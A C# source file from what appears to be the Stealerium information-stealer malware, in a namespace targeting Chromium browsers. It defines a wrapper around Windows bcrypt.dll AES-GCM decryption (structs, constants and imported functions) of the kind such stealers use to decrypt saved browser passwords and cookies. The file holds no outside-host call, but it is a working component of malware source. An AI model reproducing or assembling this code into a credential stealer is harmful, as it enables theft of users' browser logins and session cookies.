using System;
using System.Runtime.InteropServices;

namespace Stealerium.Target.Browsers.Chromium;

public static class CbCrypt
{
	public struct AuthenticatedCipherModeInfo : IDisposable
	{
		public int cbSize;

		public int dwInfoVersion;

		public IntPtr pbNonce;

		public int cbNonce;

		public IntPtr pbAuthData;

		public int cbAuthData;

		public IntPtr pbTag;

		public int cbTag;

		public IntPtr pbMacContext;

		public int cbMacContext;

		public int cbAAD;

		public long cbData;

		public int dwFlags;

		public AuthenticatedCipherModeInfo(byte[] iv, byte[] aad, byte[] tag)
		{
			this = default(AuthenticatedCipherModeInfo);
			dwInfoVersion = BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
			cbSize = Marshal.SizeOf(typeof(AuthenticatedCipherModeInfo));
			if (iv != null)
			{
				cbNonce = iv.Length;
				pbNonce = Marshal.AllocHGlobal(cbNonce);
				Marshal.Copy(iv, 0, pbNonce, cbNonce);
			}
			if (aad != null)
			{
				cbAuthData = aad.Length;
				pbAuthData = Marshal.AllocHGlobal(cbAuthData);
				Marshal.Copy(aad, 0, pbAuthData, cbAuthData);
			}
			if (tag != null)
			{
				cbTag = tag.Length;
				pbTag = Marshal.AllocHGlobal(cbTag);
				Marshal.Copy(tag, 0, pbTag, cbTag);
				cbMacContext = tag.Length;
				pbMacContext = Marshal.AllocHGlobal(cbMacContext);
			}
		}

		public void Dispose()
		{
			if (pbNonce != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(pbNonce);
			}
			if (pbTag != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(pbTag);
			}
			if (pbAuthData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(pbAuthData);
			}
			if (pbMacContext != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(pbMacContext);
			}
		}
	}

	public const uint ErrorSuccess = 0u;

	public static readonly byte[] BCRYPT_KEY_DATA_BLOB_MAGIC = BitConverter.GetBytes(1296188491);

	public static readonly string BCRYPT_OBJECT_LENGTH = "ObjectLength";

	public static readonly string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";

	public static readonly string BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength";

	public static readonly string BCRYPT_CHAINING_MODE = "ChainingMode";

	public static readonly string BCRYPT_KEY_DATA_BLOB = "KeyDataBlob";

	public static readonly string BCRYPT_AES_ALGORITHM = "AES";

	public static readonly string MsPrimitiveProvider = "Microsoft Primitive Provider";

	public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 1;

	public static readonly uint StatusAuthTagMismatch = 3221266434u;

	[DllImport("bcrypt.dll")]
	public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);

	[DllImport("bcrypt.dll")]
	public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

	[DllImport("bcrypt.dll")]
	public static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

	[DllImport("bcrypt.dll")]
	internal static extern uint BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);

	[DllImport("bcrypt.dll")]
	public static extern uint BCryptImportKey(IntPtr hAlgorithm, IntPtr hImportKey, [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbInput, int cbInput, uint dwFlags);

	[DllImport("bcrypt.dll")]
	public static extern uint BCryptDestroyKey(IntPtr hKey);

	[DllImport("bcrypt.dll")]
	internal static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref AuthenticatedCipherModeInfo pPaddingInfo, byte[] pbIv, int cbIv, byte[] pbOutput, int cbOutput, ref int pcbResult, int dwFlags);
}
